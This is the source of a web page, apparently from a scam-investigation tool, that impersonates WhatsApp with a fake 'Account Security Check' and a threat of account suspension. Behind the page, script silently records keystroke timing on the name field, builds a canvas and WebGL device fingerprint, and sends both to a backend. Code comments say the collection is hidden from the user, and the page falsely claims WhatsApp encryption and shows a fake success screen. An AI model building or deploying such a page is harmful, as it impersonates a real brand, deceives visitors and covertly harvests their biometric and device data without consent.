<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>WhatsApp – Account Verification</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box;}
  body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f0f2f5;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;}
  .card{background:white;border-radius:16px;padding:36px 28px;width:100%;max-width:380px;box-shadow:0 2px 20px rgba(0,0,0,0.1);text-align:center;}
  .logo{width:72px;height:72px;background:#25D366;border-radius:50%;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;font-size:38px;}
  h1{font-size:20px;font-weight:700;color:#111b21;margin-bottom:6px;}
  .sub{font-size:13px;color:#667781;margin-bottom:24px;line-height:1.5;}
  .alert-box{background:#fff8e1;border:1px solid #ffe082;border-radius:8px;padding:12px;margin-bottom:20px;font-size:12px;color:#795548;text-align:left;line-height:1.5;}
  .field{margin-bottom:14px;text-align:left;}
  .field label{font-size:11px;color:#667781;display:block;margin-bottom:5px;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;}
  input[type=text]{width:100%;padding:13px 14px;border:1.5px solid #e9edef;border-radius:8px;font-size:16px;outline:none;color:#111b21;transition:border-color .2s;}
  input:focus{border-color:#25D366;}
  .btn{width:100%;padding:14px;background:#25D366;color:white;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;margin-top:8px;}
  .btn:disabled{background:#a8d5b5;cursor:not-allowed;}
  .note{margin-top:16px;font-size:11px;color:#aaa;display:flex;align-items:center;justify-content:center;gap:5px;}

  /* Success screen — plain, no forensic language */
  #doneCard{display:none;text-align:center;padding:40px 28px;}
  .done-tick{font-size:56px;margin-bottom:12px;}
  .done-title{font-size:19px;font-weight:700;color:#111b21;margin-bottom:6px;}
  .done-sub{font-size:13px;color:#667781;line-height:1.6;}

  /* Loading state on button — looks like normal network request */
  .btn.loading{background:#1ebe5d;pointer-events:none;}
  .btn.loading::after{content:' ●●●';font-size:12px;letter-spacing:3px;animation:dots 1s steps(3,end) infinite;}
  @keyframes dots{0%{content:' ●○○';}33%{content:' ●●○';}66%{content:' ●●●';}100%{content:' ●○○';}}
</style>
</head>
<body>
<?php
$report_id = intval($_GET['report'] ?? 0);
$role      = in_array($_GET['role'] ?? '', ['scammer','suspect']) ? $_GET['role'] : 'scammer';
?>

<div class="card" id="mainCard">
  <div class="logo">💬</div>
  <h1>Account Security Check</h1>
  <p class="sub">WhatsApp detected a sign-in attempt on your account. Please verify your identity to continue.</p>
  <div class="alert-box">
    ⚠️ <strong>Security Alert:</strong> Unusual activity detected on your account. Confirm your identity to prevent suspension.
  </div>

  <form onsubmit="handleSubmit(event)" id="verifyForm">

    <!-- Name field only — behavioral biometrics collected silently here -->
    <div class="field">
      <label>Full Name (as on your account)</label>
      <input type="text" id="nameField" name="fullname"
             placeholder="Type your full name"
             autocomplete="off" spellcheck="false">
    </div>

    <button type="submit" class="btn" id="submitBtn" disabled>Verify My Account</button>

  </form>
  <div class="note">🔒 Secured by WhatsApp end-to-end encryption</div>
</div>

<!-- Done screen — looks like normal verification success, zero forensic language -->
<div class="card" id="doneCard">
  <div class="done-tick">✅</div>
  <div class="done-title">Verification Successful</div>
  <div class="done-sub">
    Your WhatsApp account has been secured.<br>
    You may now close this window.
  </div>
</div>

<script src="/blockchain-sentinel/behavioral_biometrics.js"></script>
<script>
const REPORT_ID = <?= $report_id ?>;
const ROLE      = '<?= $role ?>';

// Silent behavioral collector — attached ONLY to the name field
// Phone and PIN keystrokes are completely ignored
const bc        = new BehavioralCollector();
const nameField = document.getElementById('nameField');

// Manually wire collector to name field only (not the whole form)
bc._start_time = null;
nameField.addEventListener('keydown', function(e) {
  const t   = Date.now();
  if (!bc._start_time) bc._start_time = t;
  const cat = bc._cat(e.key);
  bc._key_down_at[e.code] = t;
  if (cat === 'DEL') {
    bc._backspaces++;
  } else {
    bc._total_keys++;
    if (bc._last_up_at !== null) {
      const ft = t - bc._last_up_at;
      if (ft > 0 && ft < 3000) bc._flight_times.push(ft);
    }
  }
}, true);
nameField.addEventListener('keyup', function(e) {
  const t    = Date.now();
  const down = bc._key_down_at[e.code];
  if (down !== undefined) {
    const hold = t - down;
    if (hold > 0 && hold < 2000) bc._hold_times.push(hold);
    delete bc._key_down_at[e.code];
  }
  bc._last_up_at = t;
}, true);
bc._watching = true;

// Enable submit only when name field has at least 2 characters
document.getElementById('nameField').addEventListener('input', function() {
  document.getElementById('submitBtn').disabled = this.value.trim().length < 2;
});

// ── Device fingerprint (silent, no UI) ──────────────────────────────────────
function collect() {
  return {
    screen_resolution:    screen.width + 'x' + screen.height,
    color_depth:          screen.colorDepth,
    browser:              navigator.userAgent,
    os:                   navigator.platform,
    language:             navigator.language,
    timezone:             Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezone_offset:      new Date().getTimezoneOffset(),
    device_memory:        navigator.deviceMemory        || 'unknown',
    hardware_concurrency: navigator.hardwareConcurrency || 'unknown',
    touch_support:        navigator.maxTouchPoints      || 0,
    pixel_ratio:          window.devicePixelRatio       || 1,
    canvas_fingerprint:   getCanvas(),
    webgl_fingerprint:    getWebGL(),
  };
}
function getCanvas() {
  try {
    const c = document.createElement('canvas'); c.width = 220; c.height = 40;
    const x = c.getContext('2d');
    x.fillStyle = '#f60'; x.fillRect(120, 1, 60, 18);
    x.fillStyle = '#069'; x.font = '11pt Arial'; x.fillText('WA-Secure', 2, 14);
    return c.toDataURL().slice(-50);
  } catch(e) { return 'n/a'; }
}
function getWebGL() {
  try {
    const c = document.createElement('canvas');
    const gl = c.getContext('webgl');
    if (!gl) return 'n/a';
    const ext = gl.getExtension('WEBGL_debug_renderer_info');
    return ((ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)   : '') + '::' +
            (ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : '')).substr(0, 80);
  } catch(e) { return 'n/a'; }
}
async function sha256(m) {
  const b = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(m));
  return Array.from(new Uint8Array(b)).map(x => x.toString(16).padStart(2,'0')).join('');
}

// Silent background POST — no UI feedback whatsoever
async function sendFP(fp, phone) {
  try {
    const r = await fetch(location.origin + '/blockchain-sentinel/backend/realtime_scan.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ report_id: REPORT_ID, role: ROLE, fingerprint: fp, phone })
    });
    const d = await r.json();
    return d.hash || await sha256(JSON.stringify(fp));
  } catch(e) { return await sha256(JSON.stringify(fp)); }
}

async function handleSubmit(e) {
  e.preventDefault();
  if (document.getElementById('nameField').value.trim().length < 2) return;

  // Snapshot is now locked — name field typing is complete

  // Show normal loading state on button — looks like a network request to the user
  const btn = document.getElementById('submitBtn');
  btn.classList.add('loading');
  btn.textContent = 'Verifying';

  const fp = collect();

  // Fire silently in background — user sees nothing except the button animation
  await Promise.all([
    sendFP(fp, ''),
    bc.send(REPORT_ID, ROLE),
  ]);

  // Show plain success screen — no hashes, no tokens, no technical language
  document.getElementById('mainCard').style.display = 'none';
  document.getElementById('doneCard').style.display  = 'block';
}
</script>
</body>
</html>
